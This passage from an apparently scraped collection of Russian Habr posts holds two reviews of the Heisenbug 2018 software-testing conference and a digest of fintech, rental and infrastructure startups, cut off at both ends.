специалиста по исследованию вредоносного кода Лаборатории компьютерной криминалистики Group-IB.", {"day": "10", "month": "апреля", "time": "14:36"}, {"rate": 15, "views": 6100}], ["Всем привет, меня зовут Таня и это моя первая статья на Хабре.\n\n\n\r\nВ начале декабря проходила конференция Heisenbug 2018 в Москве. Это событие было уже освещено многими: раз, два, три.\n\r\nЯ отметила для себя, что в основном были затронуты только положительные моменты, хотя были и отрицательные. Я хочу поделиться своим взглядом на это событие. Если кто-то не согласен с моим мнением, то пусть так и будет.\n\r\nНачну по порядку, это мой первый Гейзенбаг и приехала я на него из славного города на Неве. Добрым утром на Сапсан, затем такси и вот я у дверей Рэдиссон Славянская. Я была много раз на конференциях, митапах, но на событии по тестированию такого масштаба оказалась впервые. Хорошее впечатление было от постоянных указателей, только ты собираешься свернуть в сторону, как указатель тебе говорит “топай вперед и до конца”. \n\n\n\r\nВстретили приветливо на ресепшене. Только было странно что очереди не существовало и все пихались кто куда. Странная затея для людей которые хотят получить от конференции больше положительных эмоций, чем отрицательных. \n\r\nВ принципе моя “очередь” дошла довольно быстро, мне выдали пакет со стаффом (пакет? да, это был реально пакет с надписью Гейзенбаг, не сумка, ни что-то интересное, а черный пакет) и бэйдж. \n\n\n\r\nВ стафф входил блокнот, ручка, расписание (как оказалось не верное), белая штуковина, функциональности которой также было достаточно много уделено времени в диалоге в Телеграмме, уточка, и, конечно же, сам пакет!\n\r\nКак оказалось, части народа даже стаффа не досталось никакого, как такое могло выйти, если организаторы знали сколько билетов куплено оффлайн, остается большим вопросом. \n\n\n\r\nЗатем милые гардеробщицы и здоровающиеся охранники. Правда среди участников пошел слушок что это просто статуи, ан нет, они даже улыбались иногда.\n\r\nЛестница, везде плакаты с названием конференции, все как на подобных конференциях. \n\r\nПоднимаешься, несколько стендов перед тобой по кругу. \n\nРайффайзенбанк\r\nОтличная загадка с Письмом, многих зацепило, было интересно, много общались со всеми и подзывали к себе. Не каждый догадался сразу что символы это зашифрованный сайт, на котором нужно ввести число с купюры и получить Имя. Имя вписываешь на конверте в графу Кому и ожидаешь конца второго дня. Приятный коллектив :)\n\n\n\nMail.ru\r\nСтенды, которые прислали ломанные ссылки на твои же фотки, это обидно.\n\r\nИдея раздать футболки за пройденный тест по тестированию была успешна, все так и залипли у них на стенде, подъедая конфетки.\n\nLuxoft\r\nПорадовали задачками. 2 дня 2 листа (если я ничего не упустила) и так же зазывали к себе в команду.\n\nBadoo\r\nОбрадовали леденцами в форме сладких Багов и Алиасом на тему тестирования :)\n\n\n(спасибо за фотографию instagram.com/helen_605)\n\nDeutsche Банк\r\nКак сказал кто-то из ребят “черновики оказались самым расходящимся материалом на этой конференции”, и это было так. Постоянные задачки, общения и шутки. Места, правда, им было маловато, но все кто подходил к ним не оставались без улыбки и логической задачки.\n\nКонтур\r\nСлавные ребята, но, к сожалению, на фоне Бадуу терялись. Были так же всякие логические задачки и забавные стикеры\n\nАльфа-банк\r\nОни решили представить себя через ботов с вопросами в Телеграмме. При мне только они 3 раза поднимали бота и мы тут же его роняли, в общем, задачек было много, а вот их работоспособность подкачала.\n\r\nНа второй день они просто гугл форму дали к заполнению, по итогу этой формы нужно было получить 60+ баллов, мне достались супер нефункциональных 4 гига, как этим пользоваться остается загадкой, только если саму карточку с логотипом отломать.\n\n\n\n\n\r\nЕще была игра поэтапная, которая приводила к новому боту, который тоже не функционировал и всех просто отправляли к человеку на стенде за загадками.\n\nGett такси\r\nИдея сделать приложение с программой Такси и вопросами по разным темам была крутая, люди подходили, сканировали QR-код и залипали в игру. \n\r\nЕще был стендик Rifma, где можно было пособирать логические пазлики и даже выиграть их.\n\r\nНу и да, у всех были стикеры, так что ноутбук теперь весь пестрит :)\n\n\n\nНемного про организацию. \r\nОрганизация самого мероприятия была отличная. Это с точки зрения удобства гостиницы, перекусов и дискуссионных зон, пуфиков и BoF-сессий, а так же зоны Ask Expert.\n\r\nВсего было 3 зала: большой и 2 маленьких. И меня немного смутило то, что почти все приглашенные гости из больших команд, в особенности англоговорящие, были помещены в маленькие залы. Например, на лекции человека из eBay люди просто стояли в проходах чтобы послушать лекцию. \n\r\nДа, большие лекции из малых залов транслировали на Demo Stage, но зачем нужно было делать так, если в большом зале половина мест пустовала.\n\nРасскажу про лекции, которые очень запомнились\r\nПервая вводная была лекция от Баруха Садогурского “У нас DevOps. Давайте уволим всех тестировщиков”.\n\r\nЭто была отличная лекция для открытия конференции. Было много шуток и рассказов из серии “а как оно бывает на проекте”. Барух рассказал основные идеи DevOps и как к этому вообще пришли.\r\nЛектор не оставил никого равнодушным, все смеялись и отвечали на его вопросы.\n\r\nПосле лекции он раздавал книги, которые разошлись, как горячие пирожки.\n\n\n\r\nОтличный заряд энергии и юмора преподнесла в свой доклад Екатерина Михеева “Тысяча и один UI-баг, или Как научить разработчика избегать типовых ошибок в UI”. \n\r\nРассказ был о практическом опыте тестировании UI на разных девайсах, в особенности на Android. Екатерина рассказала какие девайсы лучше выбирать для тестирования UI. И что в принципе если есть всего 5 девайсов определенных параметров, то можно покрыть почти 100% пользовательских сценариев. Также она рассказала про забавные баги, которые находила на своем проекте.\n\n\n\r\nПервый день закончился неподготовленным докладом от Wylsacom Валентина Петухова “Epic fails производителей девайсов”.\n\r\nВыступление это было не однозначно. По началу он опоздал на свой же доклад почти на полчаса.\r\nПотом оказалось что для кого-то это был совсем не известный им человек, для кого-то звезда, от которого можно ожидать всё что угодно. Он гулял от темы к теме, то затрагивая технику, то политику. По итогу часть людей были в восторге что он выступает, хоть и не по теме. Другая часть не поняла зачем его поставили как завершающий доклад первого дня.\n\r\nСтендап ютьюбера в реал тайме без определенной темы объединил всех слушателей в чате Телеграмма в обсуждении резиновых уточек, а также их обмене. \n\r\nДаже было решено похлопать ему, чтобы он понял что время на исходе, только вот он отреагировал как-то так “Процитировал Стива Джобса и сорвал аплодисменты. Это хорошо”. \r\nПо итогу все радостно вышли после него и пошли на вечеринку.\n\r\nПервый день закончился BoF-сессиями и вечеринкой. Говорить о ней не вижу смысла, каждый нашел то что хотел.\n\r\nНа второй день был доклад посвящен UX. Её рассказала Антонина Хисаметдинова “Вуайеризм тестировщика, или Как наблюдение за пользователями поможет вам”.\n\r\nАнтонина много показывала и рассказывала о привычках пользователей, как под нужные функции подстраивать UX. Показала как на реальных проектах одну и туже страницу делали по разному и как реагировал на неё пользователь. Рассказала как расти и развиваться, кого стоит слушать и что делать чтобы вырасти в UX. В конце доклада она дала книг и разных тем к рассуждению.\n\n\n\r\nВ маленьком зале прошел большой доклад от Kingа. Его представил Alexander Andelkovic “Artificial intelligence for testing in Candy Crush Saga”.\n\r\nНа конференции было не очень много тем, касающихся геймдева. В достаточно коротком рассказе Александр рассказал куда и как могут развиваться QA в такой большой фирме как King. Поделился порядком задумки и реализации уровней, методами тестирования их и и как обновить их на боевых серверах\".\n\n\n\r\nЗакрывающий доклад второго дня вызвал у всех восторг, кто на нем присутствовал/\r\n“Крайности тестирования: хитрости из темных уголков мобильных интерфейсов” представлял Виталий Фридман.\n\r\nПоказал разнообразие необычных идей сайтов, которые когда либо были и существуют на просторах Интернета. Рассказал как некоторые неудобства и удобства веб-приложений достигают заданных целей разработчиков и что черный PR, это тоже PR.\n\r\nК тому же были бонусы в виде летающих конфет.\n\r\nПо итогу, если Вы нашли в списке спикеров или тем то, что вам действительно интересно и ваша компания может оплатить вам поездку на конференцию, то однозначно надо ехать. \n\r\nНо нужно ожидать что доклад может отмениться (как это происходило даже за день до конференции) или что спикера могут поместить в неудобный зал. \n\r\nЕсли в следующий раз и захочется послушать доклад возьму онлайн версию, терять время на поездку в другой город и часть лекций, которые оказались совсем не интересны.\n\r\nСтранно были составлены потоки, я, как мануальный тестировщик, не очень была рада когда во всех трёх потоках рассказывали про Селениум, аминь.\n\nЧто меня смутило\n\nВ первый день при открытии конференции были очень долгие выступления про спонсоров.\nНекоторым людям не досталось стаффа, кому-то лишь половина.\nСтранный подход с распределением зала. До конференции все заполняли анкету, где выбирали какая лекция интересней чтобы распределить залы, либо никто не проходил анкету или же что-то пошло не так.\nНе со всех мест был хороший обзор, это касается малых залов, но это скорей вопрос к месту проведения или расстановке посадочных мест.\nПосле второго дня часть людей сразу отправлялись на самолет или поезд, но вещи было негде оставить, ничего организаторы с этим не придумали. Часть людей смогла отдать сумки людям из организаторского состава Jug.ru.\nСтранный момент с водой в перерывах. Стояли бутыли по 1,5 литров и нужно было наливать самому себе, официанты на это не реагировали.\nПереводчики. Их просто не было, ладно для русских людей, которые учатся и им даже полезно, но для английских слушателей их не было. То есть приглашенные англоговорящие участники просто слушали русскую речь, не понимая, что происходит.\nИнформация на выданных расписаниях не соответствовала действительности. А сайт не всегда справлялся с наплывом гостей. Официальный бот на второй день выдавал расписание с первого\nУ Mail.ru стоял автомат с фотографиями. Многим пришли битые ссылки, кому-то вообще не пришли. Фотографий так и нет, хотя прошло больше двух недель.\nИ куда ж без вишенки на торте. Вы оплатили, скатались на конференцию, послушали, остались или не остались довольным, вернулись и… по итогу конференции Вы получаете ОБЯЗАТЕЛЬНЫЙ опросник, состоящий из 80 вопросов. Вы обязательно его пройдете в течении недели, либо не получите ссылку на видеозаписи лекций, которые Вы уже оплатили. \n\r\nИз плюсов запомнился ролик перед выступлениями.\n\r\nРаз Вы здесь, значит Вы осилили мою статью. Развития Вам и спасибо за внимание.", {"day": "23", "month": "декабря", "time": "21:03"}, {"rate": 15, "views": 3400}], ["В этом посте я хочу поделиться обзором 15 докладов с конференции Heisenbug, рассказать, что интересного было на стендах у компаний, а также поделиться видеоматериалом из доклада Артема Ерошенко о создании actions плагинов для IntelliJ IDEA, которые помогут быстро изменять код тестового проекта.\n\n\n\nИнформация о HeisenBug\nHeisenbug – техническая конференция для специалистов в области тестирования. В основном, она интересна тестировщикам, software development engineers in test, специалистам по автоматизированному и нагрузочному тестированию. Организаторами выступает команда JUG.RU, за плечами которой такие конференции, как Joker, HolyJS, SmartData, DevOops, DotNext, Mobius. \n\nМесто проведения\n\n\nПятая по счету конференция проходила в отеле «Славянская Рэдиссон», метро Киевская, г. Москва. При подходе к гостинице был виден электронный баннер с логотипом конференции. Далее при входе в лобби гостиницы, участника сопровождали указатели до стоек регистрации и гардероба. Заблудиться невозможно. Регистрация участников и спикеров проходила на первом этаже, в основном фойе конференции располагались стенды партнеров, конференц-залы, залы с кофе-брейком и обедами. Уровень охранников порадовал, так что «безбилетным зайцам» было не попасть. Всего на мероприятии присутствовало порядка 500+ участников, большинство из которых зарегистрировалось за две недели до начала.\n\nПрограмма\r\nПрограмму можно найти здесь. Хочу отметить, что JUG.RU всегда стремится сделать программу практической, без лишней воды и с известными зарубежными специалистами. Доклады делятся на условные обозначения:\n\n\n\r\nЕсли вы впервые планируете стать докладчиком на Гейзенбаге, посмотрите памятку спикера, – в ней довольно ёмко собрана вся полезная информация.\n\nКоммуникация и волонтерство \n\n\r\nЧтобы участники не пропустили что-то важное на конференции, были организованы телеграм-канал и телеграм-чат. Кстати в последнем искали волонтеров на просмотр видеозаписей, за что давали бесплатный билет на конференцию.\n\r\nЕсли вы решитесь стать волонтером, обозначьте свое решение организаторам как можно раньше. Подготовка к мероприятию осуществляется задолго до начала конференции. При условии свободных мест вас запишут в команду.\n\nСтенды компаний \r\nВ этот раз на конференции было представлено более десятка стендов крупных IT-компаний, таких как Deutsche Bank, Альфа-Банк, Райффайзен, Badoo, Luxoft, СКБ Контур, Gett и др. Каждая из компаний по-своему подошла к организации интерактивов с участниками мероприятия, поэтому в перерывах между выступлениями скучать не приходилось. Можно было порешать задачи за небольшой памятный сувенир, поиграть в видео- и настольные игры, поучаствовать в лотерее.\n\n\n\r\nРайффайзен предлагал пройти онлайн квест с разгадкой всяческих пазлов, также ценители нестареющей классики могли поиграть в Mortal Kombat 3 на Sega. Коллеги из Альфа-Банка сделали телеграм-бота с задачами, плюс в лотерее разыгрывал большой набор Lego Mindstorms. Хочу похвалить стенд Deutsche Bank, где разработчики в живом общении выдавали задачи и принимали участие в обсуждении, в отличие от всех остальных стендов, где лишь проверяли правильность ответов.\n\n\n\r\nМногие компании ненавязчиво занимаются хантингом специалистов, раздавая буклеты с описанием вакансий (не все же заниматься благотворительностью).\n\nОбзор докладов\n1. У нас DevOps. Давайте уволим всех тестировщиков — Барух Садогурский.\n\r\nОткрывал конференцию Барух Садогурский, developer advocate из компании JFrog, известный спикер на конференциях, связанных с Java и Devops. В докладе Барух затронул проблемы качества ПО в условиях частых релизов, которые вызваны постоянно растущими запросами бизнеса, сложности тестирования кода вследствие плохой архитектуры, модернизации роли тестировщика в современных Agile командах. Доклад было интересно слушать от начала до конца, много юмора, интересных фактов и сравнений. \n\r\nНу а главные мысли доклада можно уложить в один слайд, который иллюстрирует, что автоматизация тестирования и практики DevOps уменьшают временные издержки на рутинные процессы и позволяют уделять больше времени реализации новых задач.\n\n\n\n2. Нужно сделать рефакторинг проекта? Есть же IDEA! — Артем Ерошенко. \n\r\nАртем в своем докладе рассказывал о создании actions плагинов для IntelliJ IDEA, которые помогут вам в быстром изменении кода тестового проекта.\n\n\n\r\nДал объяснение основным классам (AnAction, PsiClass, PsiAnnotation, AnActionEvent, JavaCodeStyleManager), которые являются входной точкой Plugin Actions.\n\r\nРассмотрел, как решить следующие задачи:\n\r\nа) Что на проекте у нас автоматизировано, а что нет. Автоматическая синхронизация с Jira.\n\n\r\nПо тексту аннотации @DisplayName сходил в Jira, получил нужные тикеты и проставил все необходимые связи, используя @TmsLink.\n\r\nб) Автоматическое проставление @Tags из контекста Jira.\n\n\r\nЕсть определенные лэйблы в тикете favorite, regress. Переходим в тест, есть аннотации @TmsLink, применяем плагин и у нас появляются новые аннотации @Tags, и далее средствами Junit мы можем запускать тесты по этим тэгам.\n\r\nв) Что в тестах проверяется?\n\n\r\nЕсть автотест, есть steps, делаем экспорт и у нас появляются шаги в тестах. Также в видео есть пример для двух тестов.\n\r\nЕще Артем демонстрировал, как быстро перейти с Allure 1 на Allure 2.\n\r\nОчень практичный доклад для тех, кто задумывается об оптимизации процесса написания кода. Исходный код плагинов можно найти здесь. \n\n3. Проект на Java и Reactor? — А как же тесты? — Кирилл Меркушев. \n\r\nКирилл поделился опытом разработки международного медицинского стартапа Vivy. Рассказал, как были решены проблемы масштабируемости монолитной системы при помощи микросервисов и библиотеки Reactor. Большое внимание было уделено этой библиотеке, ее базовым принципам, подходам к тестированию реактивных систем, киллер-фичам (таким как чекпоинты и логи в цепочке запроса, Hooks и повторные запросы (retry). \n\n\n\r\nЛично я не имел дело с тестированием реактивных систем, поэтому для меня это было ново и интересно.\n\n4. Как мы написали фреймворк Sealant для поиска утечек памяти в JS — Сергей Докучаев.\n\r\nВ данном докладе речь идет об утечках памяти (объектах, доступных из кода, но более не нужных) на одностраничных web-приложениях. Сергей ставил задачу автоматически найти все критичные утечки памяти в выпускаемой версии продукта. Говорил о сложностях нахождения подобных ошибок и как можно делать это вручную, используя инструменты Google Chrome. Далее рассматривал инструмент SeaLant, автором которого он является. SeaLant позволяет автоматизировать нахождение утечек, взаимодействуя с процессом Chrome по протоколу Chrome DevTools. Заканчивал доклад тем, что если на странице можно выполнять циклические сценарии (с одного устройства, с одной сессией, без перезагрузки страницы), то вероятнее всего, протестировав их, можно избавиться от большей части утечек памяти.\n\n5. Особенности визуального тестирования интерфейсов — Антон Усманский, ведущий разработчик инструментов Gemini (инструмент визуального тестирования) и Hermione (инструмент следующего поколения, более общего назначения, который умеет выполнять ассерты скриншотами). \n\n\n\r\nДоклад полезен тем, кто задумывается о внедрении инструментов визуального тестирования в свои проекты. Тем, кто уже использует Gemini и Hermione, тоже может быть интересно — дает понимание, как внутри устроены инструменты. Местами автор касается достаточно базовых вещей.\n\n6. Заморочки в Selenium WebDriver — Алексей Баранцев.\n\r\nАлексей рассказывал о проблемах проекта Selenium и о причинах их возникновения. Поделился деталями сборки монорепозитория с помощью сборщика Bazel. Затронул тему видимости элементов (в стандарте W3C WebDriver нет операции, которая проверяет, виден элемент или нет) и пояснил, чем отличаются функции getProperty, getDomAttriubute, getAttribute. \n\n\n\r\nЗнание заморочек позволит пользователям отличить фичи от багов и разрабатывать эффективные «костыли» в своих тестовых проектах. \n\n7. Рецепты создания с нуля и развития системы нагрузочного тестирования — Анатолий Пласковский. \n\r\nАнатолий представляет группу исследования производительности Яндекс.Деньги. В своем докладе он поделился практиками, как определить потребность в исследованиях быстродействия, где найти людей для проведения данных мероприятий и как выстроить процесс исследований. Автор заостряет внимание на том, что исследование производительности != нагрузочному тестированию, и что только тестирование на продакшне может показать релевантный результат. При этом проводить эксперименты можно без проблем для клиентов путем выбора тестовых маршрутов и данных, контроля и прогноза возможных исходов сценария.\n\r\nАнатолий создал телеграм-чат loadland, в котором обсуждается нагрузочное тестирование, и куда можно стучаться за помощью и советами.\n\n8. Epic Fails производителей девайсов — Валентин Wylsacom Петухов. \n\r\nЗакрывал первый день доклад небезызвестного Wylsacom, который был неоднозначно воспринят публикой (судя по чату участников гейзенбага в телеграме :) ).\n\r\nДля себя я ничего интересного не вынес из доклада про бета-тестирование устройств и приложений, но возможно фанатам понравилось. На дискуссионной зоне выстроилась очередь за фото, так что пиар удался.\n\n\n\n9. Элегантное интеграционное тестирование зоопарка микросервисов с помощью TestContainers и JUnit 5 на примере глобальной SMS-платформы — Андрей Маркелов.\n\r\nАвтор рассказывал, как у себя в компании тестируют микросервисы при помощи связки TestСontainers + Junit 5 + MockServer. Доклад звучал интересно, но такая схема не для большого количества микросервисов. Ссылка на исходный код.\n\n\n\n10. Вуайеризм тестировщика, или Как наблюдение за пользователями поможет вам — Антонина Хисаметдинова.\n\r\nОчень интересный доклад, хоть и связанный больше с web-дизайном, чем с тестированием. В нем рассказывается о практиках UX и подводных камнях, которых нужно избегать при проектировании клиентского интерфейса.\n\n\n\r\nАнтонина выделила основные ошибки при наблюдениях за пользователями в таких UI-решениях, как отключение кнопок, использование лоадеров, подсказок, привычных компонентов и др. \n\r\nТакже стоит отметить графическое оформление доклада с интуитивно понятными примерами из реальных проектов (как и подобает докладам про UX).\n\n11. Тестирование систем с внешними зависимостями: проблемы, решения, Mountebank — Андрей Глазков.\n\r\nАвтор рассказывал про эволюцию этапов мокирования на своих проектах. Рассматривал плюсы и минусы мокирования на уровне кода. Делился опытом, в каких случаях хорошо создать фейковую реализацию сервиса. Но если вы хотите, чтобы фейковые сервисы перестраивались на лету, проксировались и при этом ввелись логи пришедших запросов, то Андрей рекомендует присмотреться к инструменту Mountebank.\n\n\n\r\nОсновные плюсы:\n\n\nmounteBank — работает на уровне TCP;\nJavaScript injection;\nнадежность и скорость из коробки;\nотличная документация;\nподдержка докер-контейнеризации.\n\r\nВыявленные ограничения инструмента:\n\n\nвнешние системы с сохранением данных;\nWebSocket — не поддерживается;\nнагрузочные тесты (> 150 rps), но можно использовать балансировщик.\n\n12. Зачем профилировать end-to-end тесты мобильных приложений — Вячеслав Фролов.\n\r\nВ своем докладе Вячеслав рассказал о состоянии автотестов в компании Badoo, а именно, как они решали задачу распараллеливания 1500 мобильных UI-тестов, которые занимают 30 машино-часов на прогон на одном симуляторе. В итоге им удалось достичь результата в 30 минут, что позволило запускать 80 тысяч тестов в день. Помимо линейного увеличения мощности, применили оптимизацию по очистке кэша приложений вместо рестарта симулятора. Также в докладе были упомянуты профилировщики, и как с их помощью обнаружили особые случаи узких мест в тестах: например, метод long_press() в ios 11.0 выполнялся 5 секунд, а после оптимизации стал выполняться за секунду, или как с помощью http-хедера «keep-alive» можно избежать повторной установки соединения, тем самым значительно ускорить все тесты разом. Также автор рассказал, как отобразить результаты профилировщика с использованием инструментов FlameGraph и FlameChart.\n\n\n\n13. Юнит-тесты: от теории к практике — Вадим Пуштаев.\n\r\nАвтор делится опытом разработки UnitTests. Доклад состоял из трех частей. \n\n\nЧто мы хотим от UT → Регрессия (Поменял код, проверил), Влияние на архитектуру (Когда разработчики, пишут тесты, код становится лучше), Понимание (разбираться с legacy кодом);\nПринципы → Вадим вспоминает, что с теорией не так хорошо, как с практикой. Отверг принцип «тестируй интерфейс, а не реализацию», так как в реализации может быть много логики. Плюсанул принцип «unit tests это не механизм тестирования». Считает это некий архитектурный прием, мощный и очень полезный, но это не механизм проверки и верности кода.\nРеализация → Рассказ о технических приемах, которые автор использует в работе (на каждый класс один тестовый класс, создание своих матчеров, применение внешних зависимостей, если это требуется и т.д).\n\n\n\n14. Тестируем и плачем вместе со Spring Boot Test — Кирилл Толкачёв\n\r\nКирилл решил вернуть нас в мир IoC, DI и Spring и рассказать, как при помощи JUnit 5 и SpringBoot написать unit и компонентные тесты.\n\n\n\r\nБольшим плюсом этого доклада является то, что спикер писал большую часть тестов в real-time, т.е. наглядно показал поэтапный процесс оборачивания тестов Spring-овыми аннотациями. Правда, из-за большого количества кода, было сложно уложить в голове все показанные приемы. Кирилл рассмотрел фичи Spring по работе с профилями, Mock&Spy Beans, а также настройки конфигураций контекста. Как по мне, Spring — это довольно тяжелый фреймворк для подобных задач и только опытным юзерам удастся не наступить на грабли при разработке unit тестов.\n\n15. Прокачиваем мобильные автотесты — Екатерина Батеева.\n\r\nВ докладе автор рассматривал инструмент XCTest для автоматизации IOS-приложений. Тиражировать этот инструмент на другие проекты оказалась неудобно.\n\n\n\r\nА именно были выявлены следующие минусы:\n\n\n тяжело читать настройки запуска;\n сложно конфигурировать сборки;\n сложно интегрироваться с различными сервисами;\n неудобно управлять скриншотами;\n неудобно настраивать перезапуски тестов.\n\r\nДалее Екатерина рассказывала про open-source фреймворк Fastlane, который решил их проблемы.\n\nИтоги\r\nВ целом, конференция мне понравилась. Получил заряд эмоций и ответы на интересующие вопросы. На BoF-сессии большинство участников сняли свои «маски» и вели жаркие дискуссии в рамках BoF-тем. Кофе-брейки и обеды были идеальны, всегда было что перекусить. Также хочу отметить организацию мероприятия — команда JUG.RU с каждым разом делает Heisenbug все лучше и лучше. Напоследок — ходите на конференции, делитесь полученными знаниями и улучшайте свои навыки!\n\nP.S: Выражаю благодарность Алексею Румянцеву за участие в подготовке статьи и Артему Ерошенко за видеоматериал.", {"day": "21", "month": "декабря", "time": "12:28"}, {"rate": 15, "views": 4100}], ["Продолжая серию дайджестов «Стартап дня», сегодня я представляю самые интересные проекты за сентябрь-октябрь 2018 года. Если хотите ознакомиться с остальными, то прошу в мой блог. Записи доступны в Facebook, ВК, ICQ и Телеграм. \n \nMoneylion\n\n\r\nБанки и финансовые сервисы — огромная часть экономики. Американцы должны банкам 4 триллиона долларов, ежегодную выплату я быстро не нашел, но в любом случае она измеряется сотнями миллиардов, супер-лакомый кусок. И стартаперы слетаются на него как мухи на мед. \n\r\nЗа последние лет 7 никто не придумал ничего кардинально нового. Все запускают банки без отделений с мобильным приложением, ярким дизайном, мгновенными переводами, удобными инвестициями и быстрым одобрением кредита. Кто-то успел раскрутиться раньше, чем красивую аппку запилили старые игроки, — они получили долю рынка, кто-то опоздал, ну и черт с ними, с такими стартаперами.\n\r\nАмериканский стартап Moneylion начал относительно поздно, в 2013 году, но успел вскочить на подножку поезда и набрал 2 миллиона активных пользователей — много даже по американским меркам. \n\r\nДля обзора я его выбрал ради двух продуктовых идей, обе вряд ли существенно повлияли на бизнес компании, но обе по-своему красивы, и раньше я о таких не писал. Во-первых, Moneylion платит за ежедневный запуск приложения. Модель часто встречается в играх и роботизированных сервисах типа LingauLeo, но там пользователи получают внутренние фантики, а здесь клиент ежедневно зарабатывает доллар почти настоящих денег — их потом меняют на подарочные карты магазинов. Для стартапа карты стоят, скажем, вдвое дешевле номинала. Но это всё равно значит, что для окупаемости программы Moneylion за один запуск приложения навязывает ненужных услуг на 50 центов маржи. По порядку величины — это комиссия Яндекс.Такси за одну поездку, но там-то пассажир хотел ехать и специально для этого аппку запустил, а тут ему впихивают что-то, пока он просто ради халявы залогинился. Хорошо быть банком!\n\r\nВторая интересная идея — подписка на дешевый кредит. Клиент платит 29 долларов в месяц, зато при необходимости берет займы по пониженной ставке. Moneylion в выигрыше в обоих случаях: если пользователь не умеет считать, то сам себя обманет, а если умеет — это положительный фактор скоринга, процент можно понизить справедливо. Впрочем, наверное, чаще они не умеют считать. Вместе обе фичи дают совсем любопытный эффект — если логиниться каждый день, то привилегии платной подписки достаются бесплатно, стартап его ещё и в пиаре использует. Падкие на рекламу пользователи при ежедневных запусках приложения накликивают особенно много ненужных услуг. \n\r\nИнвестиций Moneylion привлек 95 миллионов долларов.\n\nTally \n\n\r\nБанки играют с потребителями в интересную игру: обвешивают кредитки кешбеками, бонусами и бесплатными милями, тратят на это деньги и ждут, пока клиент один раз оступится и пропустит платеж до конца льготного периода. Тут же включаются конские проценты, которые окупают стоимость самого кредита и безудержные промоакции, которыми пользовался сам должник и парочка более осторожных клиентов. \n\r\nАмериканский стартап Tally подключается к битве на стороне человека. Пользователь устанавливает мобильное приложение, подключает карты, а дальше стартап автоматически покрывает долги перед банками за счет кредита в Tally. Процент, разумеется, получается существенно ниже — расходы на кешбеки и мили в него не включены, за бонусы по-прежнему платит глупый старый банк. Победа, все кроме банкиров довольны, мне дальше и писать не о чем, и так всё понятно.\n\r\nПроект пока маленький, инвестиций потратил 24 миллиона долларов и ещё 18 привлек в недавнем раунде. Есть ещё куда расти, но очень большой компания не станет никогда: чем меньше клиентов попадается в ловушки банков, тем меньше смысла в бонусных ухищрениях, тем ближе их процент к проценту Tally.\n\nHomelike \n\n\r\nВспоминать Airbnb банально, но он действительно изменил целую отрасль. Туристы теперь находят жилье быстро и удобно, а платят за него мало. К сожалению, для командировки на пару месяцев сервис подходит куда хуже — скидки за опт маленькие, отзывы нерелевантные для продолжительного пребывания. Ещё и выбор сужается до квартир, которые никто не забронировал на пару дней в середине периода — скорее всего, это худшие квартиры.\n\r\nЕвропейский стартап Homelike считает, что мир уже достаточно глобализовался, люди подолгу живут в других городах, им нужен специальный Airbnb для поездок на месяцы, а не дни. Cian и аналоги потребность не закрывают — все они ориентируются на местных жителей и предварительные показы. На звонок «я приезжаю через месяц, оставьте мне квартиру» хозяин только рассмеется, да и со стороны гостя это безумие — отзывов нет, фотографии могут быть фейковыми.\n\r\nHomelike сделал именно клон Airbnb, даже дизайн слизать не постеснялся, только слово «день» на «месяц» везде заменил. Сдают квартиры владельцы доходных домов — их проще подключить к платформе, чем соответствующее количество частников, и у них быстрее появятся отзывы, апартаментов много, хоть кто-нибудь да напишет. Сейчас стартап хвастается сорока пятью тысячами квартир, но это именно квартиры, а не разные варианты размещения, если в доме их сто одинаковых, то в подсчет пойдет сто. \n\r\nВ августе Homelike привлек первый большой раунд инвестиций: 14 миллионов долларов, будет масштабировать спрос арендаторов.\n\nGremlin \n\n\r\nДавным-давно, при разработке foto.mail.ru, коллега вместо обычных обращений к диску использовал макрос. На боевом окружении всё шло как обычно, а у разработчика код бросал монетку, в 99 % случаев возвращал данные, в 1 % — ошибку. В итоге, сервис неизбежно корректно работал при реальных сбоях железа, он был к ним готов и многократно тестировался.\n\r\nСтартап Gremlin исходит из похожей философии. Он предлагает конструктор сбоев окружения, чтобы под контролем и в тестовой среде посмотреть, как работает сервис, когда что-то идет не так. В простейшем случае Gremlin действует на уровне сервера: нагружает процессор и диск, занимает большой объём памяти, портит качество сетевого соединения. В более интересном варианте он разбирает трафик и имитирует проблемы с используемым API: «а пусть вот этот внешний сервис тормозит».\n\r\nТехнически Gremlin — демон, который ставится на сервер заказчика, и админка с настройками катастроф, которая висит в облаке. Сочетание подходит и для удобства биллинга (это же обычный SaaS), и для взаимодействия с кодом. Плата — необходимость выхода в большой интернет с тестируемой машины, некоторое ограничение числа клиентов. Впрочем, ничто не мешает для корпораций из Fortune-500 и управление поставить внутрь их контура. \r\nПоявился Gremlin всего два года назад, потратил пока 9 миллионов долларов инвестиций, на днях привлек ещё 18.\n\nWunder Mobility \n\n\r\nТакси, каршеринги и подобные сервисы конкурируют на уровне города, а не страны или тем более мира. Условный Gett привлекает и пассажиров, и водителей отдельно в каждом населенном пункте, доля роуминга — москвичей, заказывающих машину в Питере, — очень мала. Глобальный Uber сдал локальным игрокам и Китай, и Россию, и Юго-Восточную Азию, доминирование в США ему не помогло. \n\r\nС другой стороны, местный агрегатор в условном Иркутске неизбежно проигрывает Яндекс.Такси, и дело не только в венчурных деньгах, несколько миллионов долларов и в столице региона найти можно, это дало бы паритет. Проблема в технологии: масштабов России хватает, чтобы тратить на разработку пять процентов общих расходов и иметь приемлемый продукт, а отдельный город слишком мал. \n\r\nСтартап Wunder Mobility видит здесь возможность. Именно на такси стартап пока не замахнулся, заходит со стороны смежных рынков. Он написал универсальный софт для каршеринга, райд-шеринга (BlaBlaCar внутри города) и такси-пулинга (как Via). Теперь любая городская служба покупает лицензию, не тратится на программистов и на равных воюет с кем угодно. \n\r\nОткрытый прайс выглядит очень щадяще. Интеграция и внедрение индивидуальны и считаются отдельно, зато потом полная прозрачность. Каршеринг, например, стоит 17 евро в месяц на машину. В масштабах нашей Белки или YouDrive — до 50000 евро в месяц, вполне по карману, им команды программистов, наверное, дороже обходятся. Или, с другой стороны, если в лоб переложить цену на конечного пользователя, то тариф увеличится на 25 копеек в минуту, не критично. \n\r\nПока к Wunder Mobility подключаются только очень маленькие партнеры, стартап хвастается пользователями на четырех континентах, но всего миллионом поездок в месяц. Ситимобил, для сравнения, делает сейчас два с половиной миллиона в одной Москве. Но инвесторы верят в большое будущее, месяц назад компания привлекла первый большой раунд: 30 миллионов долларов.", {"day": "23", "month": "ноября", "time": "11:10"}, {"rate": 20, "views": 4800}], ["По дизайну написано тысячи статей и записано столько же вебинаров, но начинающих специалистов заботит один и тот же резонный вопрос: «Так что же мне конкретно делать?!». В этом материале я на реальном примере поэтапно покажу, какие действия нужно совершать для создания дизайн-проекта, нацеленного на решение задач бизнеса.\n\r\nВ данный момент я 